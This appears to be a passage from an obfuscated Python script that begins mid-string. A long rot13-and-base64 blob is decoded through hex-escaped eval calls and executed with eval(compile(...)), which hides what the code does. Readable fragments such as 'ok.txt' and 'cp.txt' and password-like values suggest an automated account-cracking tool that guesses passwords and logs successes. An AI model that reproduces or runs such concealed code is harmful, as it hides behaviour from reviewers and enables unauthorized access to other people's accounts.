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'
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))